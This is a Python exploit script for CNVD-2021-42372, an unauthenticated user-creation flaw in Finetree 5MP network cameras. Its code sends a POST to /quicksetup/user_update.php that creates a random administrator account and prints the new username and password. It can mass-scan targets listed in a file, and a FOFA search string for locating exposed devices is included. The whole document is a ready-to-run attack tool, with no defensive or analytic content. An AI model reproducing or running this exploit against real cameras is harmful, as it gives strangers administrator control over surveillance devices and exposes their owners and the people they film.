#!/usr/bin/env python
# -*- conding:utf-8 -*-
# Finetree 5MP 摄像机任意用户添加
# fofa:  app="Finetree-5MP-Network-Camera"
import requests
import argparse
import sys
import urllib3
import random
import threading
urllib3.disable_warnings()


def title():
    print("""
  _____  _   _ __      __ _____           ___    ___   ___   __          _  _    ___   ____   ______  ___  
 / ____|| \ | |\ \    / /|  __ \         |__ \  / _ \ |__ \ /_ |        | || |  |__ \ |___ \ |____  ||__ \ 
| |     |  \| | \ \  / / | |  | | ______    ) || | | |   ) | | | ______ | || |_    ) |  __) |    / /    ) |
| |     | . ` |  \ \/ /  | |  | ||______|  / / | | | |  / /  | ||______||__   _|  / /  |__ <    / /    / / 
| |____ | |\  |   \  /   | |__| |         / /_ | |_| | / /_  | |           | |   / /_  ___) |  / /    / /_ 
 \_____||_| \_|    \/    |_____/         |____| \___/ |____| |_|           |_|  |____||____/  /_/    |____| 

                                                                                        Author:Henry4E36
               """)


class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file
    

    def target_url(self):
        payload = self.url + "/quicksetup/user_update.php"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        username = ''.join(random.sample("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",8))
        passwd = ''.join(random.sample("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_.1234567890!@#",8))
        data = f"method=add&user={username}&pwd={passwd}&group=3&ptz_enable=0" # 1.访客 2.操作者 3.管理员
        
        try:
            res = requests.post(url=payload, headers=headers, data=data, verify=False, timeout=5)
            if res.status_code == 200 and "200" in res.text:
                print(f"\033[31m[{chr(8730)}] 目标系统: {self.url} 存在任意用户添加！\033[0m")
                print(f"\033[31m[{chr(8730)}] 用户名: {username} 密码: {passwd} \033[0m")
                print("[" + "-"*100 + "]")
            elif res.status_code == 200 and "804" in res.text:
                print(f"[\033[31mx\033[0m] 目标系统: {self.url} 用户重复！")
                print("[" + "-"*100 + "]")
            elif res.status_code == 200 and "802" in res.text:
                print(f"[\033[31mx\033[0m] 目标系统: {self.url} 用户满了！")
                print("[" + "-"*100 + "]")
            else:
                print(f"[\033[31mx\033[0m]  目标系统: {self.url} 不存在任意用户添加！")
                print("[" + "-"*100 + "]")
        except Exception as e:
            print("[\033[31mX\033[0m]  连接错误！")
            print("[" + "-"*100 + "]")


    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description='Finetree 5MP 摄像机任意用户添加')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 CNVD-2021-42372.py -u http://127.0.0.1 \neg2:>>>python3 CNVD-2021-42372 -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()

        